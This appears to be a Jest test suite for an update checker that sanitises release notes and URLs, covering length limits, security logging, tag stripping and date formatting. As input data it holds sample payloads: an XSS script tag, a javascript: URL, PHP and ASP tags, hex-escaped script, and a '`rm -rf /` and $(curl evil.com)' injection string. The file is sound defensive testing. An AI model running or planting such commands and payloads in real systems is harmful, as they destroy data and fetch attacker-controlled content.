import { describe, it, expect, beforeEach, jest } from '@jest/globals';
import { UpdateChecker } from '../../../src/update/UpdateChecker';
import { VersionManager } from '../../../src/update/VersionManager';

describe('UpdateChecker (Performance Enhancements)', () => {
  let versionManager: VersionManager;
  let securityLogger: jest.Mock;

  beforeEach(() => {
    versionManager = new VersionManager();
    securityLogger = jest.fn();
  });

  describe('configurable limits', () => {
    it('should use custom release notes length limit', () => {
      const customLimit = 1000;
      const updateChecker = new UpdateChecker(versionManager, {
        releaseNotesMaxLength: customLimit
      });

      const longNotes = 'A'.repeat(2000);
      const result = {
        currentVersion: '1.0.0',
        latestVersion: '1.1.0',
        isUpdateAvailable: true,
        releaseDate: '2025-01-06T10:00:00Z',
        releaseNotes: longNotes,
        releaseUrl: 'https://github.com/test/repo'
      };

      const formatted = updateChecker.formatUpdateCheckResult(result);
      
      // Should be truncated at custom limit
      expect(formatted).toContain('A'.repeat(customLimit) + '...');
      expect(formatted).not.toContain('A'.repeat(customLimit + 1));
    });

    it('should use custom URL length limit', () => {
      const customLimit = 500;
      const updateChecker = new UpdateChecker(versionManager, {
        urlMaxLength: customLimit,
        securityLogger
      });

      const longUrl = 'https://github.com/' + 'a'.repeat(600) + '/repo';
      const result = {
        currentVersion: '1.0.0',
        latestVersion: '1.1.0',
        isUpdateAvailable: true,
        releaseDate: '2025-01-06T10:00:00Z',
        releaseNotes: 'Test release',
        releaseUrl: longUrl
      };

      const formatted = updateChecker.formatUpdateCheckResult(result);
      
      // URL should be blocked
      expect(formatted).not.toContain(longUrl);
      expect(securityLogger).toHaveBeenCalledWith('url_too_long', expect.objectContaining({
        length: longUrl.length,
        maxLength: customLimit
      }));
    });
  });

  describe('security logging', () => {
    it('should log when HTML content is removed', () => {
      const updateChecker = new UpdateChecker(versionManager, { securityLogger });

      const result = {
        currentVersion: '1.0.0',
        latestVersion: '1.1.0',
        isUpdateAvailable: true,
        releaseDate: '2025-01-06T10:00:00Z',
        releaseNotes: 'Safe content <script>alert("xss")</script> more content',
        releaseUrl: 'https://github.com/test/repo'
      };

      updateChecker.formatUpdateCheckResult(result);

      expect(securityLogger).toHaveBeenCalledWith('html_content_removed', 
        expect.objectContaining({ removedLength: expect.any(Number) })
      );
    });

    it('should log when dangerous URL schemes are blocked', () => {
      const updateChecker = new UpdateChecker(versionManager, { securityLogger });

      const result = {
        currentVersion: '1.0.0',
        latestVersion: '1.1.0',
        isUpdateAvailable: true,
        releaseDate: '2025-01-06T10:00:00Z',
        releaseNotes: 'Test release',
        releaseUrl: 'javascript:alert("xss")'
      };

      updateChecker.formatUpdateCheckResult(result);

      expect(securityLogger).toHaveBeenCalledWith('dangerous_url_scheme', 
        expect.objectContaining({ scheme: 'javascript:' })
      );
    });

    it('should log when injection patterns are removed', () => {
      const updateChecker = new UpdateChecker(versionManager, { securityLogger });

      const result = {
        currentVersion: '1.0.0',
        latestVersion: '1.1.0',
        isUpdateAvailable: true,
        releaseDate: '2025-01-06T10:00:00Z',
        releaseNotes: 'Normal text `rm -rf /` and $(curl evil.com)',
        releaseUrl: 'https://github.com/test/repo'
      };

      updateChecker.formatUpdateCheckResult(result);

      expect(securityLogger).toHaveBeenCalledWith('injection_patterns_removed', 
        expect.objectContaining({ removedLength: expect.any(Number) })
      );
    });

    it('should log when release notes are truncated', () => {
      const updateChecker = new UpdateChecker(versionManager, { 
        securityLogger,
        releaseNotesMaxLength: 100
      });

      const result = {
        currentVersion: '1.0.0',
        latestVersion: '1.1.0',
        isUpdateAvailable: true,
        releaseDate: '2025-01-06T10:00:00Z',
        releaseNotes: 'A'.repeat(200),
        releaseUrl: 'https://github.com/test/repo'
      };

      updateChecker.formatUpdateCheckResult(result);

      expect(securityLogger).toHaveBeenCalledWith('release_notes_truncated', 
        expect.objectContaining({ 
          originalLength: 200,
          maxLength: 100
        })
      );
    });
  });

  describe('OWASP patterns', () => {
    it('should remove PHP tags', () => {
      const updateChecker = new UpdateChecker(versionManager);

      const result = {
        currentVersion: '1.0.0',
        latestVersion: '1.1.0',
        isUpdateAvailable: true,
        releaseDate: '2025-01-06T10:00:00Z',
        releaseNotes: 'Normal text <?php echo "hack"; ?> more text',
        releaseUrl: 'https://github.com/test/repo'
      };

      const formatted = updateChecker.formatUpdateCheckResult(result);
      
      expect(formatted).not.toContain('<?php');
      expect(formatted).not.toContain('?>');
      expect(formatted).toContain('Normal text  more text');
    });

    it('should remove ASP tags', () => {
      const updateChecker = new UpdateChecker(versionManager);

      const result = {
        currentVersion: '1.0.0',
        latestVersion: '1.1.0',
        isUpdateAvailable: true,
        releaseDate: '2025-01-06T10:00:00Z',
        releaseNotes: 'Normal text <% Response.Write("hack") %> more text',
        releaseUrl: 'https://github.com/test/repo'
      };

      const formatted = updateChecker.formatUpdateCheckResult(result);
      
      // DOMPurify encodes the tags, then we remove them
      expect(formatted).not.toContain('&lt;%');
      expect(formatted).not.toContain('%&gt;');
      expect(formatted).toContain('Normal text  more text');
    });

    it('should remove hex escapes', () => {
      const updateChecker = new UpdateChecker(versionManager);

      const result = {
        currentVersion: '1.0.0',
        latestVersion: '1.1.0',
        isUpdateAvailable: true,
        releaseDate: '2025-01-06T10:00:00Z',
        releaseNotes: 'Normal text \\x3cscript\\x3e\\x20attack more text',
        releaseUrl: 'https://github.com/test/repo'
      };

      const formatted = updateChecker.formatUpdateCheckResult(result);
      
      expect(formatted).not.toContain('\\x3c');
      expect(formatted).not.toContain('\\x3e');
      expect(formatted).not.toContain('\\x20');
      // After removing hex escapes, we get 'script attack'
      expect(formatted).toContain('Normal text scriptattack more text');
    });
  });

  describe('timezone handling', () => {
    it('should format dates consistently regardless of local timezone', () => {
      const updateChecker = new UpdateChecker(versionManager);

      // Use a specific date that would differ across timezones
      const result = {
        currentVersion: '1.0.0',
        latestVersion: '1.1.0',
        isUpdateAvailable: true,
        releaseDate: '2025-01-05T23:59:59Z',  // Near midnight UTC
        releaseNotes: 'Test release',
        releaseUrl: 'https://github.com/test/repo'
      };

      const formatted = updateChecker.formatUpdateCheckResult(result);
      
      // Should always show as January 5 when formatted in UTC
      expect(formatted).toMatch(/January 5, 2025/);
    });
  });

  describe('DOMPurify caching', () => {
    it('should reuse DOMPurify instance across multiple calls', () => {
      const updateChecker1 = new UpdateChecker(versionManager);
      const updateChecker2 = new UpdateChecker(versionManager);

      const result = {
        currentVersion: '1.0.0',
        latestVersion: '1.1.0',
        isUpdateAvailable: true,
        releaseDate: '2025-01-06T10:00:00Z',
        releaseNotes: '<b>Test</b> release',
        releaseUrl: 'https://github.com/test/repo'
      };

      // Both should work without recreating JSDOM
      const formatted1 = updateChecker1.formatUpdateCheckResult(result);
      const formatted2 = updateChecker2.formatUpdateCheckResult(result);
      
      expect(formatted1).toContain('Test release');
      expect(formatted2).toContain('Test release');
      expect(formatted1).not.toContain('<b>');
      expect(formatted2).not.toContain('<b>');
    });
  });
});